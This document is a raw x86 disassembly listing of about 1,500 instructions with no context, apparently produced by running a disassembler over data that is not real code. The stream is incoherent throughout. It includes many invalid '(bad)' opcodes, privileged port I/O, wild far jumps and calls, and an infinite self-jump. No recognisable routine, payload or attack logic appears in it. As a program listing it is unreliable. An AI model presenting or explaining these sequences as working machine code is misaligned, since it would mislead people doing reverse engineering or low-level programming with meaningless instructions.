  40f6ca:	repz retf 
  40f6cc:	push   esp
  40f6cd:	jne    0x40f68a
  40f6cf:	inc    ecx
  40f6d0:	stos   BYTE PTR es:[edi],al
  40f6d1:	jmp    0x8a01f94b
  40f6d6:	retf   
  40f6d7:	mov    DWORD PTR [edx-0x57],edx
  40f6da:	into   
  40f6db:	aas    
  40f6dc:	inc    eax
  40f6dd:	sub    edx,DWORD PTR [edx]
  40f6df:	push   0x91c65fc0
  40f6e4:	jb     0x40f74c
  40f6e6:	scas   al,BYTE PTR es:[edi]
  40f6e7:	xlat   BYTE PTR ds:[ebx]
  40f6e8:	sub    ecx,edx
  40f6ea:	lods   al,BYTE PTR ds:[esi]
  40f6eb:	mov    bh,0x40
  40f6ed:	cld    
  40f6ee:	stos   BYTE PTR es:[edi],al
  40f6ef:	dec    ebp
  40f6f0:	fstp   TBYTE PTR [ebx-0x2a]
  40f6f3:	shl    BYTE PTR [esi+0x729fc682],0x98
  40f6fa:	fcmove st,st(3)
  40f6fc:	dec    esp
  40f6fd:	ret    
  40f6fe:	mov    esi,0xb970a6ec
  40f703:	call   0xc00ebdcb
  40f708:	or     eax,0x9ecd1617
  40f70d:	lahf   
  40f70e:	push   edi
  40f70f:	xchg   ecx,eax
  40f710:	gs out 0x4e,al
  40f713:	mov    ah,0x1b
  40f715:	inc    ebp
  40f716:	in     eax,0xc1
  40f718:	es (bad) 
  40f71a:	and    BYTE PTR [eax],bh
  40f71c:	push   cs
  40f71d:	mov    bl,0xdf
  40f71f:	dec    edi
  40f720:	retf   
  40f721:	mov    dl,0x71
  40f723:	cld    
  40f724:	pop    ds
  40f725:	pop    esp
  40f727:	adc    al,0x7a
  40f729:	mov    ch,0x3e
  40f72b:	inc    esi
  40f72c:	cdq    
  40f72d:	pusha  
  40f72e:	or     eax,0x7bb8f484
  40f733:	xor    ecx,DWORD PTR [edi-0x79]
  40f736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f737:	push   esi
  40f738:	nop
  40f739:	cmp    esi,DWORD PTR [esi+edx*4]
  40f73c:	pop    edx
  40f73d:	int    0x3c
  40f73f:	pop    esi
  40f740:	and    al,0x85
  40f742:	cmp    eax,0x1e41a9a5
  40f747:	and    ebp,DWORD PTR [esi+0x65a64df0]
  40f74d:	aas    
  40f74e:	and    BYTE PTR [edx-0x5015da17],bl
  40f754:	iret   
  40f755:	or     BYTE PTR [edi],bh
  40f757:	js     0x40f763
  40f759:	pop    ecx
  40f75a:	std    
  40f75b:	push   es
  40f75c:	jmp    0x5806:0xb0ac9c7e
  40f763:	out    dx,eax
  40f764:	ret    0x5851
  40f767:	retf   0xd7b8
  40f76a:	clc    
  40f76b:	js     0x40f75d
  40f76d:	aad    0xb3
  40f76f:	in     al,0xe5
  40f771:	test   BYTE PTR [ebx+0x6ee0bcd8],cl
  40f777:	xor    BYTE PTR [ebp+0x4bac4187],al
  40f77d:	mov    ch,0x36
  40f77f:	and    al,0x36
  40f781:	out    0x42,al
  40f783:	sub    BYTE PTR [esi],ch
  40f785:	dec    edx
  40f786:	cld    
  40f787:	push   esp
  40f788:	xchg   esp,eax
  40f789:	(bad)  
  40f78a:	stc    
  40f78b:	test   BYTE PTR [edx-0x57],ah
  40f78e:	xor    dl,0xeb
  40f791:	mov    dh,0x4b
  40f793:	and    DWORD PTR [edi],edi
  40f795:	adc    al,0x2
  40f797:	cmp    bh,al
  40f799:	mov    ?,WORD PTR [ecx-0x4c]
  40f79c:	(bad)  
  40f79e:	push   esp
  40f79f:	test   DWORD PTR [ecx+0x23],ecx
  40f7a2:	pop    ecx
  40f7a3:	stos   BYTE PTR es:[edi],al
  40f7a4:	test   DWORD PTR [eax+0x20],edi
  40f7a7:	push   0x8ea1b04c
  40f7ac:	nop
  40f7ad:	ja     0x40f812
  40f7af:	icebp  
  40f7b0:	rol    BYTE PTR [ecx+0x5705d23f],1
  40f7b6:	clc    
  40f7b7:	in     eax,dx
  40f7b8:	jbe    0x40f7f3
  40f7ba:	lock int3 
  40f7bc:	stos   BYTE PTR es:[edi],al
  40f7bd:	ins    DWORD PTR es:[edi],dx
  40f7be:	pop    es
  40f7bf:	cld    
  40f7c0:	xor    eax,DWORD PTR [ecx-0x4f]
  40f7c3:	ja     0x40f78d
  40f7c5:	jp     0x40f7f4
  40f7c7:	cli    
  40f7c8:	imul   esp,DWORD PTR ds:0x5783fb82,0x588319ff
  40f7d2:	enter  0xdc97,0x4c
  40f7d6:	mov    bl,0x6
  40f7d8:	aaa    
  40f7d9:	pop    es
  40f7da:	sbb    DWORD PTR [edi],0xb42d8e50
  40f7e0:	pop    ss
  40f7e1:	mov    bl,0xb9
  40f7e3:	clc    
  40f7e4:	nop
  40f7e5:	cmp    eax,0x6962bef7
  40f7ea:	aam    0xef
  40f7ec:	(bad)  
  40f7ed:	fisttp WORD PTR [ebx+0x5]
  40f7f0:	stc    
  40f7f1:	shr    dh,cl
  40f7f3:	mov    fs,esi
  40f7f5:	lahf   
  40f7f6:	ffree  st(3)
  40f7f8:	xchg   edx,eax
  40f7f9:	ja     0x40f829
  40f7fb:	lahf   
  40f7fc:	neg    BYTE PTR [ebx+0x4d]
  40f7ff:	imul   BYTE PTR [ecx-0x510fd48c]
  40f805:	ss jle 0x40f837
  40f808:	call   0x8fd4300e
  40f80d:	xchg   edx,eax
  40f80e:	mov    cl,0x6c
  40f810:	aad    0xf6
  40f812:	jmp    0x40f812
  40f814:	mov    ah,bl
  40f816:	popa   
  40f817:	add    DWORD PTR [eax+eiz*1],edx
  40f81a:	pushf  
  40f81b:	push   0xfffffffc
  40f81d:	stos   DWORD PTR es:[edi],eax
  40f81e:	fisubr WORD PTR [ebx-0x608d126a]
  40f824:	cwde   
  40f825:	(bad)  
  40f826:	daa    
  40f827:	inc    esi
  40f828:	pop    ebx
  40f829:	sbb    DWORD PTR [ecx-0x31],esp
  40f82c:	int    0x98
  40f82e:	xor    eax,ecx
  40f830:	jns    0x40f868
  40f832:	jmp    0x40f806
  40f834:	aam    0x1d
  40f836:	mov    al,0xea
  40f838:	arpl   WORD PTR [eax+0x6924513e],sp
  40f83e:	xor    eax,0xb2c78f
  40f843:	sub    al,0x1c
  40f845:	mov    ds:0xd1d08471,al
  40f84a:	jns    0x40f8b8
  40f84c:	push   edi
  40f84d:	or     BYTE PTR [ebx+0x6cf39174],bl
  40f853:	push   0xffffffd7
  40f855:	aas    
  40f856:	scas   al,BYTE PTR es:[edi]
  40f857:	xchg   esp,eax
  40f858:	adc    al,0x3a
  40f85a:	cmp    DWORD PTR [ecx],ebp
  40f85c:	add    eax,0x3a70f279
  40f861:	fsub   st(3),st
  40f863:	dec    ecx
  40f864:	lock sub DWORD PTR [ecx-0x38170da5],0x73
  40f86c:	mov    ebx,0xf58ac3c0
  40f871:	pop    ss
  40f872:	(bad)  
  40f873:	sahf   
  40f874:	(bad)  
  40f875:	mov    eax,0x70e6be0f
  40f87a:	addr16 cdq 
  40f87c:	push   0x34
  40f87e:	or     dl,BYTE PTR [ebp-0x51]
  40f881:	inc    esi
  40f882:	les    esi,FWORD PTR [ebx+0x42ba8ba4]
  40f888:	push   ebx
  40f889:	cmp    DWORD PTR ss:[eax-0x5],edi
  40f88d:	xchg   esp,eax
  40f88e:	sar    DWORD PTR [ecx+0x6773f463],cl
  40f894:	xor    esp,DWORD PTR [edi-0x16]
  40f897:	xor    ebp,edx
  40f899:	mov    dh,0x33
  40f89b:	cli    
  40f89c:	mov    ebx,0xb27e5ad9
  40f8a1:	inc    ebp
  40f8a2:	dec    esp
  40f8a3:	sub    dl,BYTE PTR [ebx]
  40f8a5:	test   eax,0x77f44bbb
  40f8aa:	mov    ebp,0xe801e156
  40f8af:	rcr    esp,0xc3
  40f8b2:	add    al,0xc8
  40f8b4:	sbb    DWORD PTR [edi],edx
  40f8b6:	scas   al,BYTE PTR es:[edi]
  40f8b7:	out    0x46,al
  40f8b9:	js     0x40f907
  40f8bb:	loopne 0x40f91c
  40f8bd:	jbe    0x40f8f6
  40f8bf:	test   eax,edi
  40f8c1:	out    0x57,eax
  40f8c3:	sbb    al,al
  40f8c5:	jecxz  0x40f908
  40f8c7:	add    BYTE PTR [ebx],ah
  40f8c9:	shl    DWORD PTR [ecx-0x2f302d3e],0x12
  40f8d0:	push   0x8915d624
  40f8d5:	outs   dx,DWORD PTR ds:[esi]
  40f8d6:	(bad)  
  40f8d7:	outs   dx,BYTE PTR ds:[esi]
  40f8d8:	ds jae 0x40f870
  40f8db:	pop    ebp
  40f8dc:	not    DWORD PTR [edx+0x0]
  40f8df:	in     al,0x32
  40f8e1:	int    0x48
  40f8e3:	cmp    ecx,DWORD PTR [esp+esi*8+0x65]
  40f8e7:	mov    ebx,DWORD PTR [ebx-0x322e03de]
  40f8ed:	push   ss
  40f8ee:	lahf   
  40f8ef:	dec    edi
  40f8f0:	jae    0x40f8f8
  40f8f2:	xor    cl,cl
  40f8f4:	cmp    eax,0xa5f7dab3
  40f8f9:	pop    esp
  40f8fa:	call   0x36089ccc
  40f8ff:	aaa    
  40f900:	(bad)  
  40f901:	jo     0x40f8e0
  40f903:	and    eax,0x6fc59392
  40f908:	jae    0x40f8fb
  40f90a:	nop
  40f90b:	icebp  
  40f90c:	test   al,0xc8
  40f90e:	mov    esi,0x29977b6e
  40f913:	and    ecx,DWORD PTR [esi-0x71]
  40f916:	inc    esp
  40f917:	xlat   BYTE PTR ds:[ebx]
  40f919:	imul   esp,DWORD PTR [ebp+0x74147d74],0xffffff99
  40f920:	into   
  40f921:	or     BYTE PTR [edx],ah
  40f923:	les    ebx,FWORD PTR [edi+0x10bd8b3d]
  40f929:	cmp    bh,BYTE PTR [ebx]
  40f92b:	add    DWORD PTR [eiz*4-0x7653c31f],esp
  40f932:	mov    esp,0x6da5d331
  40f937:	push   es
  40f938:	lds    edx,FWORD PTR [esi+0x35]
  40f93b:	fistp  WORD PTR [ecx+0x43]
  40f93e:	mov    edx,DWORD PTR [eax-0x30]
  40f941:	dec    edx
  40f942:	(bad)  
  40f943:	js     0x40f8cd
  40f945:	mov    edx,0x9468377d
  40f94a:	sbb    ah,0xa1
  40f94d:	out    dx,eax
  40f94e:	dec    esi
  40f94f:	xchg   esi,eax
  40f950:	push   es
  40f951:	std    
  40f952:	adc    eax,0xc9f232b3
  40f957:	ins    DWORD PTR es:[edi],dx
  40f958:	sbb    ebp,ebx
  40f95a:	jmp    0x378b:0xb3ac800a
  40f961:	fisub  DWORD PTR [edx]
  40f963:	cld    
  40f964:	sbb    dh,BYTE PTR [esi+0x433d6c07]
  40f96a:	data16 cmp al,dh
  40f96d:	sub    ebx,edi
  40f96f:	pusha  
  40f970:	cmp    DWORD PTR [ecx],0x35
  40f973:	icebp  
  40f974:	sub    al,0xcd
  40f976:	ret    
  40f977:	adc    BYTE PTR [edx+0x7e],0xff
  40f97b:	sbb    edi,esi
  40f97d:	test   DWORD PTR [edx],esp
  40f97f:	cmp    BYTE PTR [esi-0x3c136018],dl
  40f985:	pop    es
  40f986:	repz fild QWORD PTR [edx+0x780c427d]
  40f98d:	cwde   
  40f98e:	mov    dl,0xa3
  40f990:	jo     0x40f969
  40f992:	push   esi
  40f993:	stos   BYTE PTR es:[edi],al
  40f994:	(bad)  
  40f995:	fwait
  40f996:	inc    ebx
  40f997:	fbstp  TBYTE PTR [edx-0x2]
  40f99a:	pop    eax
  40f99b:	xor    dl,ah
  40f99d:	out    dx,al
  40f99e:	lock test eax,0xf25e79a4
  40f9a4:	or     BYTE PTR [ebx+eiz*1+0x3f923aa2],dh
  40f9ab:	cmp    dl,BYTE PTR ds:0xa9a0336b
  40f9b1:	and    al,BYTE PTR [ecx-0x5e0e713d]
  40f9b7:	repnz sbb DWORD PTR [eax],ebp
  40f9ba:	repz and DWORD PTR [ebp+eax*8+0x37],edi
  40f9bf:	mov    eax,0x739b0ee6
  40f9c4:	jle    0x40f9e8
  40f9c6:	inc    ebp
  40f9c7:	sbb    edx,0x648a00e1
  40f9cd:	adc    ebx,DWORD PTR [ebp+eax*1-0x15]
  40f9d1:	idiv   BYTE PTR [ecx]
  40f9d3:	jl     0x40f9c4
  40f9d5:	pop    esp
  40f9d6:	push   cs
  40f9d7:	adc    cl,BYTE PTR [ebp+0x73]
  40f9da:	ret    0xc2a
  40f9dd:	enter  0xdfba,0xf4
  40f9e1:	jp     0x40f9d2
  40f9e3:	pop    edx
  40f9e4:	inc    edi
  40f9e5:	popf   
  40f9e6:	inc    esi
  40f9e7:	jae    0x40f977
  40f9e9:	(bad)  
  40f9ea:	int3   
  40f9eb:	nop
  40f9ec:	or     ch,dl
  40f9ee:	repz mov cl,BYTE PTR [edx-0x56]
  40f9f2:	cmp    DWORD PTR [eax],eax
  40f9f4:	or     eax,0x3790b19a
  40f9f9:	int3   
  40f9fa:	cwde   
  40f9fb:	jnp    0x40fa4a
  40f9fd:	je     0x40f9d9
  40f9ff:	xchg   ebx,eax
  40fa00:	sbb    eax,0x1c554390
  40fa05:	outs   dx,DWORD PTR ds:[esi]
  40fa06:	inc    edi
  40fa07:	mov    ebp,0xb86b84fc
  40fa0c:	inc    edi
  40fa0d:	push   esp
  40fa0e:	add    sp,0x2e
  40fa12:	xchg   ebp,eax
  40fa13:	jnp    0x40fa80
  40fa15:	jno    0x40fa88
  40fa17:	xchg   ebp,eax
  40fa18:	in     al,dx
  40fa19:	sbb    bh,BYTE PTR [esi]
  40fa1b:	sbb    eax,0x7fc2b6f8
  40fa20:	jae    0x40fa52
  40fa22:	retf   0xdc67
  40fa25:	or     BYTE PTR [eax],al
  40fa27:	in     eax,dx
  40fa28:	and    ah,bl
  40fa2a:	adc    ah,BYTE PTR [ecx]
  40fa2c:	in     al,0x8a
  40fa2e:	jmp    0x4cf2e0f0
  40fa33:	mov    ch,0x92
  40fa35:	and    bl,ah
  40fa37:	sbb    edi,edx
  40fa39:	es dec ebx
  40fa3b:	push   edi
  40fa3c:	pop    bx
  40fa3e:	loope  0x40fab5
  40fa40:	loope  0x40f9d9
  40fa42:	out    0xed,al
  40fa44:	aas    
  40fa45:	jl     0x40fa71
  40fa47:	test   cl,dh
  40fa49:	mov    bl,0xb3
  40fa4b:	sub    eax,0xc64e2bbf
  40fa50:	lods   eax,DWORD PTR ds:[esi]
  40fa51:	stc    
  40fa52:	cmp    cl,ch
  40fa54:	ror    BYTE PTR [eax],cl
  40fa56:	leave  
  40fa57:	mov    edx,0x5a4ca56c
  40fa5c:	cmc    
  40fa5d:	ins    DWORD PTR es:[edi],dx
  40fa5e:	dec    eax
  40fa5f:	(bad)  
  40fa60:	dec    ecx
  40fa61:	sub    BYTE PTR [ebx],dh
  40fa63:	stos   DWORD PTR es:[edi],eax
  40fa64:	sbb    eax,0x4e2ffbb4
  40fa69:	pop    ebp
  40fa6a:	les    ebx,FWORD PTR [esi-0x2d]
  40fa6d:	fisubr DWORD PTR [edi+0x1b]
  40fa70:	(bad)  
  40fa71:	idiv   esi
  40fa73:	sub    eax,0x95d26863
  40fa78:	retf   0x230f
  40fa7b:	jl     0x40fa43
  40fa7d:	adc    cl,ah
  40fa7f:	xchg   DWORD PTR [edi+0x6c],ebp
  40fa82:	jl     0x40fae5
  40fa84:	rol    BYTE PTR [edi+ecx*1-0x73],1
  40fa88:	xchg   esp,eax
  40fa89:	out    dx,eax
  40fa8a:	not    DWORD PTR [ecx-0x74]
  40fa8d:	out    0x7f,al
  40fa8f:	fidivr WORD PTR [ebx-0x1bbd17be]
  40fa95:	int3   
  40fa96:	or     BYTE PTR ds:[ebp+ecx*2+0x65511bd6],ch
  40fa9e:	push   ecx
  40fa9f:	dec    eax
  40faa0:	mov    al,0x53
  40faa2:	mov    al,0x61
  40faa4:	add    al,BYTE PTR [edi+0x10]
  40faa7:	das    
  40faa8:	jg     0x40fa6b
  40faaa:	cmp    al,0x8f
  40faac:	dec    edx
  40faad:	or     eax,0xb1c294de
  40fab2:	inc    esp
  40fab3:	inc    esi
  40fab4:	or     DWORD PTR ds:0xe6f19b26,edi
  40faba:	iret   
  40fabb:	icebp  
  40fabc:	sub    bh,bh
  40fabe:	(bad)  
  40fabf:	xchg   ebx,eax
  40fac0:	push   edx
  40fac1:	xor    cl,ah
  40fac3:	repz cld 
  40fac5:	mov    bh,0x77
  40fac7:	sahf   
  40fac8:	and    ah,dl
  40faca:	add    esi,DWORD PTR [eax]
  40facc:	mov    WORD PTR [edi-0x51],?
  40facf:	add    al,0x7c
  40fad1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fad2:	cwde   
  40fad3:	adc    eax,0xb823385d
  40fad8:	cmc    
  40fad9:	lds    edx,FWORD PTR [edx+0x2d81d319]
  40fadf:	mov    bl,0x59
  40fae1:	adc    al,0x56
  40fae3:	out    0x2f,eax
  40fae5:	inc    esi
  40fae6:	stos   DWORD PTR es:[edi],eax
  40fae7:	or     al,0x22
  40fae9:	cdq    
  40faea:	dec    ebp
  40faeb:	repz in eax,0x41
  40faee:	jge    0x40fa8c
  40faf0:	shl    DWORD PTR [ebx],0x82
  40faf3:	ficom  WORD PTR [ecx-0x69]
  40faf6:	xlat   BYTE PTR fs:[ebx]
  40faf8:	fsubr  DWORD PTR [esi]
  40fafa:	cli    
  40fafb:	nop
  40fafc:	push   edi
  40fafd:	inc    esi
  40fafe:	popf   
  40faff:	sbb    eax,0xb0b83aa3
  40fb04:	inc    esi
  40fb05:	xchg   ebp,eax
  40fb06:	mov    al,ds:0x2c644226
  40fb0b:	icebp  
  40fb0c:	scas   al,BYTE PTR es:[edi]
  40fb0d:	and    DWORD PTR [eax],esp
  40fb0f:	and    ecx,DWORD PTR [ebx+eax*4]
  40fb12:	ret    0xbc83
  40fb15:	mov    ss,WORD PTR [edi]
  40fb17:	pushf  
  40fb18:	enter  0x7cf7,0x86
  40fb1c:	mov    bh,0x9c
  40fb1e:	jbe    0x40fb49
  40fb20:	cwde   
  40fb21:	mov    bl,0xd1
  40fb23:	jbe    0x40fb8b
  40fb25:	ror    BYTE PTR [edi-0x5fd82a35],0xa5
  40fb2c:	sbb    al,0x4d
  40fb2e:	mov    cl,BYTE PTR [edi+0x45]
  40fb31:	lock jmp 0x4a5:0xf39b1c63
  40fb39:	lods   al,BYTE PTR ds:[esi]
  40fb3a:	jecxz  0x40fb38
  40fb3c:	dec    ebx
  40fb3d:	inc    esi
  40fb3e:	sub    DWORD PTR [edi+0x52cf3ca3],esi
  40fb44:	shr    DWORD PTR [ebp-0x790ecfbd],0xff
  40fb4b:	call   0xdfdc:0xd8bf6340
  40fb52:	and    cl,al
  40fb54:	xchg   edi,eax
  40fb55:	rcr    BYTE PTR [edi+0x39],cl
  40fb58:	push   es
  40fb59:	in     eax,0x35
  40fb5b:	and    eax,0x5aec11af
  40fb60:	mov    ds:0xb93c3938,al
  40fb65:	jle    0x40fb8d
  40fb67:	xchg   esi,eax
  40fb68:	pusha  
  40fb69:	clc    
  40fb6a:	aaa    
  40fb6b:	add    al,0xca
  40fb6d:	test   DWORD PTR [edi],esp
  40fb6f:	or     ecx,DWORD PTR [edi-0x10]
  40fb72:	adc    DWORD PTR [ecx+edi*4],ecx
  40fb75:	iret   
  40fb76:	es adc al,0x7a
  40fb79:	punpckhbw mm7,QWORD PTR [esi]
  40fb7c:	retf   0x1eb4
  40fb7f:	or     esp,edi
  40fb81:	jbe    0x40fb78
  40fb83:	push   ebp
  40fb84:	mov    ah,0x30
  40fb86:	loopne 0x40fb9c
  40fb88:	test   al,0xb
  40fb8a:	mov    esp,0x930617ad
  40fb8f:	call   0xcc6a1524
  40fb94:	jp     0x40fb8d
  40fb96:	mov    ds:0x45f87ebf,eax
  40fb9b:	in     eax,dx
  40fb9c:	dec    edi
  40fb9d:	iret   
  40fb9e:	xchg   esp,eax
  40fb9f:	jl     0x40fb6f
  40fba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fba2:	push   es
  40fba3:	outs   dx,DWORD PTR ds:[esi]
  40fba4:	and    esi,ebx
  40fba6:	or     eax,0xacac7a8
  40fbab:	aad    0xf3
  40fbad:	outs   dx,BYTE PTR ds:[esi]
  40fbae:	fld    TBYTE PTR [edx]
  40fbb0:	sbb    DWORD PTR [esi+ecx*1],esp
  40fbb3:	(bad)  
  40fbb4:	fcmovnb st,st(7)
  40fbb6:	adc    ebp,eax
  40fbb8:	or     eax,0x29bf9dcc
  40fbbd:	shl    DWORD PTR [edx+eiz*1],0xfa
  40fbc1:	ins    DWORD PTR es:[edi],dx
  40fbc2:	add    BYTE PTR [edi+edx*4+0x26352c1c],0x41
  40fbca:	rol    BYTE PTR [ecx],cl
  40fbcc:	sbb    eax,0x17804b2c
  40fbd1:	jno    0x40fbcf
  40fbd3:	leave  
  40fbd4:	mov    bh,0x9
  40fbd6:	adc    al,0x43
  40fbd8:	cld    
  40fbd9:	cmp    eax,0x65f59db6
  40fbde:	sub    bl,dl
  40fbe0:	mov    es,WORD PTR [ebx+esi*2+0x27]
  40fbe4:	adc    eax,0x9f0db135
  40fbe9:	add    esp,ebx
  40fbeb:	das    
  40fbec:	jl     0x40fbd5
  40fbee:	cmp    eax,0x38385118
  40fbf3:	xsha1  (bad)
  40fbf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbf5:	retf   0x459f
  40fbf8:	adc    eax,0xe5847983
  40fbfd:	xor    ebp,DWORD PTR [esi+eiz*4]
  40fc00:	scas   al,BYTE PTR es:[edi]
  40fc01:	imul   edx,DWORD PTR [ecx],0xebf017bf
  40fc07:	out    dx,eax
  40fc08:	inc    esi
  40fc09:	fldenv [ebx-0x7343f8ab]
  40fc0f:	or     al,0xd9
  40fc11:	mul    BYTE PTR [edi-0x64]
  40fc14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc15:	mov    cl,0xaa
  40fc17:	out    dx,al
  40fc18:	arpl   WORD PTR ds:0x4748166c,sp
  40fc1e:	pop    ecx
  40fc1f:	mov    ds:0x7a060ab5,eax
  40fc24:	pop    edx
  40fc25:	inc    ebp
  40fc26:	cmp    eax,0x761b3684
  40fc2b:	das    
  40fc2c:	addr16 mov ds:0xf045,al
  40fc30:	mov    dh,0x15
  40fc32:	xor    esi,ecx
  40fc34:	push   ebp
  40fc35:	(bad)  
  40fc36:	sub    ecx,DWORD PTR [ecx]
  40fc38:	hlt    
  40fc39:	or     dh,0x7d
  40fc3c:	dec    esp
  40fc3d:	retf   
  40fc3e:	fidiv  DWORD PTR [ebx-0x58]
  40fc41:	stc    
  40fc42:	mov    eax,0x52025d6a
  40fc47:	cmp    bh,BYTE PTR ds:0x2dc316fc
  40fc4d:	les    edx,FWORD PTR [eax]
  40fc4f:	loope  0x40fc04
  40fc51:	(bad)  
  40fc52:	mov    edx,0xbd025b66
  40fc57:	fs add al,0x67
  40fc5a:	nop
  40fc5b:	cmp    al,0x56
  40fc5d:	pop    esi
  40fc5e:	imul   esi,DWORD PTR [eax],0x7f
  40fc61:	ins    BYTE PTR es:[edi],dx
  40fc62:	fisttp WORD PTR [eax]
  40fc64:	out    dx,al
  40fc65:	mov    ebx,0xe873d9a5
  40fc6a:	inc    eax
  40fc6b:	(bad)  
  40fc6c:	pop    edx
  40fc6e:	jo     0x40fc87
  40fc70:	(bad)  
  40fc71:	cld    
  40fc72:	push   0x55
  40fc74:	adc    BYTE PTR [eax],dh
  40fc76:	jecxz  0x40fc41
  40fc78:	das    
  40fc79:	mov    ah,0xb5
  40fc7b:	pop    ss
  40fc7c:	iret   
  40fc7d:	and    dh,BYTE PTR [ecx-0x1a3575ef]
  40fc83:	jmp    0x60496d2
  40fc88:	sub    esi,DWORD PTR [edi]
  40fc8a:	cmp    al,0x24
  40fc8c:	push   ebp
  40fc8d:	or     al,0xb6
  40fc8f:	push   ds
  40fc90:	mov    esi,0x3ba6b673
  40fc95:	jne    0x40fc44
  40fc97:	mov    esi,0xa2671e22
  40fc9c:	iret   
  40fc9d:	ret    
  40fc9e:	or     cl,0xf5
  40fca1:	not    BYTE PTR [ecx-0x5b408b99]
  40fca7:	arpl   di,sp
  40fca9:	and    bl,cl
  40fcab:	es int 0x4
  40fcae:	retf   
  40fcaf:	in     eax,dx
  40fcb0:	loopne 0x40fc50
  40fcb2:	arpl   WORD PTR [esi],di
  40fcb4:	loopne 0x40fd30
  40fcb6:	mov    eax,ds:0xca05df0a
  40fcbb:	jmp    FWORD PTR [edx+0x46]
  40fcbe:	sub    DWORD PTR [edx+edx*8+0x437c45fc],edx
  40fcc5:	dec    eax
  40fcc6:	push   ds
  40fcc7:	sub    DWORD PTR [ebx+0x53f141f8],ecx
  40fccd:	adc    ch,BYTE PTR [eax+0x1b]
  40fcd0:	out    0x6c,al
  40fcd2:	rcl    BYTE PTR [eax],0x5d
  40fcd5:	xor    DWORD PTR [edi+0x34],0x2a0bc20f
  40fcdc:	inc    di
  40fcde:	add    ah,BYTE PTR [edx+eax*2-0x7f29f993]
  40fce5:	dec    esi
  40fce6:	pushf  
  40fce7:	jge    0x40fcb5
  40fce9:	mov    ebp,0xcd4c9cd2
  40fcee:	push   esp
  40fcef:	fst    QWORD PTR [ecx+0x5b]
  40fcf2:	or     BYTE PTR [esi],cl
  40fcf4:	cdq    
  40fcf5:	cs int3 
  40fcf7:	popw   es
  40fcf9:	inc    eax
  40fcfa:	sbb    DWORD PTR ds:0x37f08f67,ebp
  40fd00:	dec    ecx
  40fd01:	sub    ebp,DWORD PTR [eax+0x7b]
  40fd04:	lahf   
  40fd05:	fisub  WORD PTR [esi]
  40fd07:	(bad)  
  40fd08:	outs   dx,BYTE PTR ds:[esi]
  40fd09:	add    cl,BYTE PTR [ebx+ebx*2+0x56be4fd3]
  40fd10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd11:	call   0x3add:0x5ec575ae
  40fd18:	adc    eax,0xc0fa4115
  40fd1d:	lea    ecx,[bx+si-0x168c]
  40fd22:	rcl    ch,0xb9
  40fd25:	cmp    esi,DWORD PTR [ecx+esi*2]
  40fd28:	or     edi,esi
  40fd2a:	inc    ebx
  40fd2b:	sub    al,0x7a
  40fd2d:	cmp    al,0x87
  40fd2f:	call   0x10e88c4f
  40fd34:	mov    ah,BYTE PTR [ebx+ebx*8-0x2dde320f]
  40fd3b:	mov    cl,0x93
  40fd3d:	ret    
  40fd3e:	or     BYTE PTR [ebp-0x49],bl
  40fd41:	fs ja  0x40fd72
  40fd44:	add    al,0x89
  40fd46:	dec    ebp
  40fd47:	xor    ecx,DWORD PTR [esp+ebx*1+0x71592547]
  40fd4e:	sar    BYTE PTR [ecx+0x624c46bd],cl
  40fd54:	scas   eax,DWORD PTR es:[edi]
  40fd55:	xor    al,0xbe
  40fd57:	sub    eax,0x3f5ebd43
  40fd5c:	mov    ebp,0x9768dd5d
  40fd61:	adc    eax,0x4a242160
  40fd66:	data16 (bad) 
  40fd68:	shr    edx,cl
  40fd6a:	rol    eax,cl
  40fd6c:	shl    ebp,0xac
  40fd6f:	push   ebp
  40fd70:	jge    0x40fddb
  40fd72:	lea    esp,[edi+0x1]
  40fd75:	mov    DWORD PTR [edx-0x53],0xa88373dc
  40fd7c:	cs dec esi
  40fd7e:	aaa    
  40fd7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd80:	sub    esp,DWORD PTR [eax]
  40fd82:	mov    ch,0x6c
  40fd84:	xor    cl,BYTE PTR [ecx-0x73c648a5]
  40fd8a:	cmp    esp,0xedf6435d
  40fd90:	ds mov ah,dl
  40fd93:	sub    BYTE PTR [ebx],dh
  40fd95:	fwait
  40fd96:	out    0x44,al
  40fd98:	fcmovnb st,st(3)
  40fd9a:	stc    
  40fd9b:	sbb    al,0x14
  40fd9d:	dec    esp
  40fd9e:	pusha  
  40fd9f:	dec    edi
  40fda0:	dec    ebx
  40fda1:	sar    BYTE PTR gs:[eax-0x1e06bb4c],1
  40fda8:	inc    edx
  40fda9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdaa:	and    eax,0xa40cd4ab
  40fdaf:	in     eax,dx
  40fdb0:	jo     0x40fdee
  40fdb2:	mov    ebx,0x8f9c3746
  40fdb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdb8:	push   ds
  40fdb9:	mov    esi,0x80760a30
  40fdbe:	pop    ss
  40fdbf:	lods   al,BYTE PTR ds:[esi]
  40fdc0:	(bad)  
  40fdc1:	stos   BYTE PTR es:[edi],al
  40fdc2:	scas   eax,DWORD PTR es:[edi]
  40fdc3:	fwait
  40fdc4:	daa    
  40fdc5:	out    dx,al
  40fdc6:	out    0xc6,al
  40fdc8:	popf   
  40fdc9:	mov    BYTE PTR [edi-0x351b4c46],al
  40fdcf:	sub    ebp,esi
  40fdd1:	add    eax,0xa44d1b05
  40fdd6:	sbb    al,0x11
  40fdd8:	jl     0x40fd7d
  40fdda:	dec    ch
  40fddc:	ror    DWORD PTR [edx-0x155bc5dc],cl
  40fde2:	ror    ebp,cl
  40fde4:	inc    esi
  40fde5:	ficom  DWORD PTR [edi]
  40fde7:	jmp    0xa11b:0x6bbbae2b
  40fdee:	xchg   ecx,eax
  40fdef:	sbb    eax,0xb12faf94
  40fdf4:	and    DWORD PTR [ebp+0x68d24b98],edi
  40fdfa:	cwde   
  40fdfb:	dec    ebx
  40fdfc:	arpl   WORD PTR [ebp-0x305900a4],dx
  40fe02:	stos   BYTE PTR es:[edi],al
  40fe03:	jns    0x40fd8b
  40fe05:	int    0x67
  40fe07:	xlat   BYTE PTR ds:[ebx]
  40fe08:	scas   al,BYTE PTR es:[edi]
  40fe09:	and    bh,BYTE PTR [eax-0x45]
  40fe0c:	stos   BYTE PTR es:[edi],al
  40fe0d:	out    0x41,al
  40fe0f:	pop    edx
